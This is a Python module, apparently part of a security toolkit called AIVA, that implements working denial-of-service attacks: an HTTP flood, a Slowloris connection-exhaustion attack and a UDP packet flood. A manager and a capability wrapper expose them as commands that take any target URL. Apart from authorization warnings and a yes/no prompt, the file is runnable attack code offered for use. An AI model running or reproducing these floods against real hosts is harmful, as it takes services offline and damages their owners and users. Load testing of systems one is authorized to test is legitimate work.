#!/usr/bin/env python3
"""
AIVA DDoS Attack Tools - Task 14 (Clean Version)
分散式拒絕服務攻擊工具集
⚠️ 僅用於授權的安全測試和教育目的 ⚠️

✅ **已移至 Features 模組** ✅
本檔案提供 DDoS 壓力測試工具整合功能。
符合 AIVA 五大模組架構原則：
- Features 模組負責**實際執行測試**
- 提供負載測試和壓力測試能力

⚠️ 僅用於授權的安全測試和教育目的 ⚠️
"""

import asyncio
import json
import logging
import os
import socket
import time
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse
import random

import aiohttp
import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Confirm
from rich.table import Table

from services.aiva_common.schemas import APIResponse

console = Console()
logger = logging.getLogger(__name__)

# 常量定義
WARNING_MSG = "[yellow]⚠️  僅用於授權測試！[/yellow]"
PROGRESS_DESC = "[progress.description]{task.description}"


@dataclass
class DDoSTarget:
    """DDoS 攻擊目標"""
    url: str
    ip: Optional[str] = None
    port: int = 80
    protocol: str = "HTTP"
    method: str = "GET"
    headers: Optional[Dict[str, str]] = None
    payload: Optional[str] = None
    threads: int = 100
    duration: int = 60
    rate_limit: int = 1000
    proxy_list: Optional[List[str]] = None
    
    def __post_init__(self):
        if self.headers is None:
            self.headers = {}
        if self.proxy_list is None:
            self.proxy_list = []
        
        if not self.ip:
            parsed = urlparse(self.url)
            try:
                self.ip = socket.gethostbyname(parsed.hostname)
            except socket.gaierror:
                self.ip = "127.0.0.1"  # 默認值
            if not self.port or self.port == 80:
                self.port = 443 if parsed.scheme == 'https' else 80


@dataclass
class AttackResult:
    """攻擊結果"""
    target: str
    attack_type: str
    start_time: str
    end_time: str
    duration: float
    requests_sent: int
    successful_requests: int
    failed_requests: int
    avg_response_time: float
    max_response_time: float
    min_response_time: float
    bandwidth_used: float
    status: str
    error_details: Optional[str] = None
    
    def success_rate(self) -> float:
        if self.requests_sent == 0:
            return 0.0
        return (self.successful_requests / self.requests_sent) * 100


class HTTPFloodAttack:
    """HTTP 洪水攻擊"""
    
    def __init__(self, target: DDoSTarget):
        self.target = target
        self.session = None
        self.attack_active = False
        self.results = {
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'response_times': [],
            'bandwidth_used': 0
        }
    
    async def execute_attack(self) -> AttackResult:
        """執行 HTTP 洪水攻擊"""
        console.print(f"[bold red]🚀 開始 HTTP 洪水攻擊: {self.target.url}[/bold red]")
        console.print(WARNING_MSG)
        
        start_time = datetime.now()
        self.attack_active = True
        
        # 創建 HTTP 會話
        connector = aiohttp.TCPConnector(
            limit=self.target.threads,
            limit_per_host=self.target.threads
        )
        
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=self._get_attack_headers()
        )
        
        try:
            tasks = []
            with Progress(
                SpinnerColumn(),
                TextColumn(PROGRESS_DESC),
                console=console
            ) as progress:
                
                task_id = progress.add_task(
                    f"HTTP 攻擊中... 目標: {self.target.url}",
                    total=self.target.duration
                )
                
                # 啟動攻擊線程
                for _ in range(min(self.target.threads, 50)):  # 限制線程數
                    task = asyncio.create_task(
                        self._attack_worker(progress, task_id)
                    )
                    tasks.append(task)
                
                # 等待攻擊完成
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*tasks, return_exceptions=True),
                        timeout=self.target.duration + 10
                    )
                except asyncio.TimeoutError:
                    console.print("[yellow]攻擊超時，正在停止...[/yellow]")
                    self.attack_active = False
        
        finally:
            if self.session:
                await self.session.close()
            end_time = datetime.now()
        
        duration = (end_time - start_time).total_seconds()
        
        result = AttackResult(
            target=self.target.url,
            attack_type="HTTP Flood",
            start_time=start_time.isoformat(),
            end_time=end_time.isoformat(),
            duration=duration,
            requests_sent=self.results['requests_sent'],
            successful_requests=self.results['successful_requests'],
            failed_requests=self.results['failed_requests'],
            avg_response_time=self._calculate_avg_response_time(),
            max_response_time=max(self.results['response_times']) if self.results['response_times'] else 0,
            min_response_time=min(self.results['response_times']) if self.results['response_times'] else 0,
            bandwidth_used=self.results['bandwidth_used'] / (1024 * 1024),
            status="Success" if self.results['requests_sent'] > 0 else "Failed"
        )
        
        console.print("[bold green]✅ HTTP 攻擊完成！[/bold green]")
        return result
    
    async def _attack_worker(self, progress: Progress, task_id):
        """攻擊工作線程"""
        request_count = 0
        start_time = time.time()
        
        while self.attack_active and (time.time() - start_time) < self.target.duration:
            try:
                req_start = time.time()
                
                async with self.session.request(
                    self.target.method,
                    self.target.url,
                    data=self.target.payload,
                    headers=self.target.headers
                ) as response:
                    content = await response.read()
                    
                    req_end = time.time()
                    response_time = req_end - req_start
                    
                    # 記錄結果
                    self.results['requests_sent'] += 1
                    self.results['response_times'].append(response_time)
                    self.results['bandwidth_used'] += len(content) if content else 1024
                    
                    if response.status < 400:
                        self.results['successful_requests'] += 1
                    else:
                        self.results['failed_requests'] += 1
                
                request_count += 1
                
                # 更新進度
                if request_count % 10 == 0:
                    elapsed = time.time() - start_time
                    progress.update(task_id, completed=elapsed)
                
                # 速率限制
                if request_count % 100 == 0:
                    await asyncio.sleep(0.01)
                    
            except Exception as e:
                self.results['failed_requests'] += 1
                logger.debug(f"請求失敗: {e}")
                await asyncio.sleep(0.1)
    
    def _get_attack_headers(self) -> Dict[str, str]:
        """獲取攻擊請求頭"""
        base_headers = {
            'User-Agent': self._get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        base_headers.update(self.target.headers)
        return base_headers
    
    def _get_random_user_agent(self) -> str:
        """獲取隨機 User-Agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        return random.choice(user_agents)
    
    def _calculate_avg_response_time(self) -> float:
        """計算平均響應時間"""
        if not self.results['response_times']:
            return 0.0
        return sum(self.results['response_times']) / len(self.results['response_times'])


class SlowLorisAttack:
    """Slowloris 慢速攻擊"""
    
    def __init__(self, target: DDoSTarget):
        self.target = target
        self.sockets = []
        self.attack_active = False
    
    async def execute_attack(self) -> AttackResult:
        """執行 Slowloris 攻擊"""
        console.print(f"[bold red]🐌 開始 Slowloris 攻擊: {self.target.ip}:{self.target.port}[/bold red]")
        console.print(WARNING_MSG)
        
        start_time = datetime.now()
        self.attack_active = True
        
        try:
            # 創建連接
            self._create_connections()
            
            # 維持連接
            attack_duration = 0
            while self.attack_active and attack_duration < self.target.duration:
                self._send_partial_headers()
                await asyncio.sleep(15)
                attack_duration += 15
        
        finally:
            self._close_connections()
            end_time = datetime.now()
        
        duration = (end_time - start_time).total_seconds()
        
        result = AttackResult(
            target=f"{self.target.ip}:{self.target.port}",
            attack_type="Slowloris",
            start_time=start_time.isoformat(),
            end_time=end_time.isoformat(),
            duration=duration,
            requests_sent=len(self.sockets),
            successful_requests=len(self.sockets),
            failed_requests=0,
            avg_response_time=0,
            max_response_time=0,
            min_response_time=0,
            bandwidth_used=0.001,
            status="Success"
        )
        
        console.print("[bold green]✅ Slowloris 攻擊完成！[/bold green]")
        return result
    
    def _create_connections(self):
        """創建慢速連接"""
        console.print(f"[cyan]正在創建 {self.target.threads} 個慢速連接...[/cyan]")
        
        for _ in range(min(self.target.threads, 200)):  # 限制連接數
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target.ip, self.target.port))
                
                # 發送部分 HTTP 請求頭
                request = f"GET /{self._random_string()} HTTP/1.1\r\n"
                request += f"Host: {self.target.ip}\r\n"
                request += "User-Agent: SlowLoris\r\n"
                request += "Accept-language: en-US,en,q=0.5\r\n"
                
                sock.send(request.encode('utf-8'))
                self.sockets.append(sock)
                
            except Exception as e:
                logger.debug(f"創建連接失敗: {e}")
                continue
        
        console.print(f"[green]✅ 成功創建 {len(self.sockets)} 個連接[/green]")
    
    def _send_partial_headers(self):
        """發送部分頭部以維持連接"""
        for sock in self.sockets[:]:
            try:
                header = f"X-{self._random_string()}: {self._random_string()}\r\n"
                sock.send(header.encode('utf-8'))
            except Exception:
                self.sockets.remove(sock)
                try:
                    sock.close()
                except Exception:
                    pass
    
    def _close_connections(self):
        """關閉所有連接"""
        for sock in self.sockets:
            try:
                sock.close()
            except Exception:
                pass
        self.sockets.clear()
    
    def _random_string(self, length: int = 8) -> str:
        """生成隨機字符串"""
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choice(chars) for _ in range(length))


class UDPFloodAttack:
    """UDP 洪水攻擊"""
    
    def __init__(self, target: DDoSTarget):
        self.target = target
        self.attack_active = False
        self.packets_sent = 0
    
    async def execute_attack(self) -> AttackResult:
        """執行 UDP 洪水攻擊"""
        console.print(f"[bold red]📡 開始 UDP 洪水攻擊: {self.target.ip}:{self.target.port}[/bold red]")
        console.print(WARNING_MSG)
        
        start_time = datetime.now()
        self.attack_active = True
        
        try:
            tasks = []
            for _ in range(min(self.target.threads, 20)):  # 限制線程數
                task = asyncio.create_task(self._udp_flood_worker())
                tasks.append(task)
            
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.target.duration
            )
                
        except asyncio.TimeoutError:
            console.print("[yellow]UDP 攻擊超時，正在停止...[/yellow]")
            self.attack_active = False
        finally:
            end_time = datetime.now()
        
        duration = (end_time - start_time).total_seconds()
        
        result = AttackResult(
            target=f"{self.target.ip}:{self.target.port}",
            attack_type="UDP Flood",
            start_time=start_time.isoformat(),
            end_time=end_time.isoformat(),
            duration=duration,
            requests_sent=self.packets_sent,
            successful_requests=self.packets_sent,
            failed_requests=0,
            avg_response_time=0,
            max_response_time=0,
            min_response_time=0,
            bandwidth_used=self.packets_sent * 1.024 / (1024 * 1024),
            status="Success" if self.packets_sent > 0 else "Failed"
        )
        
        console.print(f"[bold green]✅ UDP 攻擊完成！發送了 {self.packets_sent} 個包[/bold green]")
        return result
    
    async def _udp_flood_worker(self):
        """UDP 洪水工作線程"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(1024)  # 1KB 隨機數據
        start_time = time.time()
        
        try:
            while self.attack_active and (time.time() - start_time) < self.target.duration:
                try:
                    sock.sendto(payload, (self.target.ip, self.target.port))
                    self.packets_sent += 1
                    await asyncio.sleep(0.001)
                except Exception as e:
                    logger.debug(f"UDP 包發送失敗: {e}")
                    await asyncio.sleep(0.01)
        finally:
            sock.close()


class DDoSManager:
    """DDoS 攻擊管理器"""
    
    def __init__(self):
        self.attack_results = []
    
    def create_target(self, url: str, options: Optional[Dict[str, Any]] = None) -> DDoSTarget:
        """創建攻擊目標"""
        options = options or {}
        
        return DDoSTarget(
            url=url,
            port=options.get('port', 80),
            protocol=options.get('protocol', 'HTTP'),
            method=options.get('method', 'GET'),
            headers=options.get('headers', {}),
            payload=options.get('payload'),
            threads=options.get('threads', 100),
            duration=options.get('duration', 60),
            rate_limit=options.get('rate_limit', 1000),
            proxy_list=options.get('proxy_list', [])
        )
    
    async def execute_attack(self, attack_type: str, target: DDoSTarget) -> Optional[AttackResult]:
        """執行指定類型的攻擊"""
        
        # 安全警告
        console.print(Panel.fit(
            "[bold red]⚠️  安全警告 ⚠️[/bold red]\n\n"
            "[yellow]此工具僅用於:[/yellow]\n"
            "• 授權的滲透測試\n"
            "• 安全研究和教育\n"
            "• 自己擁有的系統測試\n\n"
            "[red]請勿用於未授權攻擊！[/red]",
            border_style="red"
        ))
        
        if not Confirm.ask("您確認已獲得授權進行此測試嗎？"):
            console.print("[yellow]攻擊已取消[/yellow]")
            return None
        
        # 執行攻擊
        attack_map = {
            'http': HTTPFloodAttack,
            'slowloris': SlowLorisAttack,
            'udp': UDPFloodAttack
        }
        
        attack_class = attack_map.get(attack_type.lower())
        if not attack_class:
            raise ValueError(f"不支持的攻擊類型: {attack_type}")
        
        attack = attack_class(target)
        result = await attack.execute_attack()
        self.attack_results.append(result)
        
        return result
    
    def generate_report(self, results: Optional[List[AttackResult]] = None) -> str:
        """生成攻擊報告"""
        if results is None:
            results = self.attack_results
        
        if not results:
            return "沒有攻擊結果可以生成報告"
        
        report = f"""# 🚀 DDoS 攻擊測試報告
生成時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## 📊 攻擊摘要
- 攻擊次數: {len(results)}
- 成功攻擊: {sum(1 for r in results if r.status == 'Success')}
- 失敗攻擊: {sum(1 for r in results if r.status == 'Failed')}

## 🎯 攻擊詳情
"""
        
        for i, result in enumerate(results, 1):
            report += f"""
### 攻擊 #{i}: {result.attack_type}
- **目標**: {result.target}
- **持續時間**: {result.duration:.2f} 秒
- **發送請求**: {result.requests_sent:,}
- **成功率**: {result.success_rate():.2f}%
- **狀態**: {result.status}
"""
        
        report += """
## ⚠️  免責聲明
此報告僅用於授權的安全測試目的。
"""
        
        return report
    
    def show_attack_statistics(self):
        """顯示攻擊統計"""
        if not self.attack_results:
            console.print("[yellow]沒有攻擊結果可顯示[/yellow]")
            return
        
        table = Table(title="🚀 DDoS 攻擊統計")
        table.add_column("攻擊類型", style="cyan")
        table.add_column("目標", style="yellow")
        table.add_column("請求數", style="green")
        table.add_column("成功率", style="magenta")
        table.add_column("狀態", style="red")
        
        for result in self.attack_results:
            table.add_row(
                result.attack_type,
                result.target,
                f"{result.requests_sent:,}",
                f"{result.success_rate():.1f}%",
                result.status
            )
        
        console.print(table)


class DDoSCapability(BaseCapability):
    """DDoS 攻擊能力"""
    
    def __init__(self):
        super().__init__()
        self.name = "ddos_attack_tools"
        self.version = "1.0.0"
        self.description = "分散式拒絕服務攻擊工具集 - 僅用於授權測試"
        self.dependencies = ["aiohttp", "requests", "rich"]
        self.manager = DDoSManager()
    
    async def initialize(self) -> bool:
        """初始化能力"""
        try:
            console.print("[yellow]初始化 DDoS 攻擊工具集...[/yellow]")
            console.print("[red]⚠️  請確保僅用於授權測試！[/red]")
            return True
        except Exception as e:
            logger.error(f"初始化失敗: {e}")
            return False
    
    async def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """執行命令"""
        try:
            target_url = parameters.get('target_url')
            if not target_url:
                return {"success": False, "error": "Missing target_url parameter"}
            
            options = parameters.get('options', {})
            target = self.manager.create_target(target_url, options)
            
            if command == "http_flood":
                result = await self.manager.execute_attack('http', target)
            elif command == "slowloris":
                result = await self.manager.execute_attack('slowloris', target)
            elif command == "udp_flood":
                result = await self.manager.execute_attack('udp', target)
            elif command == "generate_report":
                report = self.manager.generate_report()
                response = APIResponse(
                    success=True,
                    message="DDoS attack report generated successfully",
                    data={"report": report}
                )
                return response.model_dump()
            elif command == "show_statistics":
                self.manager.show_attack_statistics()
                response = APIResponse(
                    success=True,
                    message="Attack statistics displayed successfully"
                )
                return response.model_dump()
            else:
                response = APIResponse(
                    success=False,
                    message=f"Unknown command: {command}",
                    errors=[f"Command '{command}' is not recognized"]
                )
                return response.model_dump()
            
            if result:
                return {"success": True, "data": asdict(result)}
            else:
                return {"success": False, "error": "Attack cancelled"}
                
        except Exception as e:
            logger.error(f"命令執行失敗: {e}")
            return {"success": False, "error": str(e)}
    
    async def cleanup(self) -> bool:
        """清理資源"""
        try:
            self.manager.attack_results.clear()
            return True
        except Exception as e:
            logger.error(f"清理失敗: {e}")
            return False


# 註冊能力
CapabilityRegistry.register("ddos_attack_tools", DDoSCapability)


if __name__ == "__main__":
    # 測試用例
    async def test_ddos_tools():
        capability = DDoSCapability()
        await capability.initialize()
        
        console.print("[bold red]⚠️  這只是演示，請勿對未授權目標執行實際攻擊！[/bold red]")
        
        await capability.cleanup()
    
    # 運行測試
    asyncio.run(test_ddos_tools())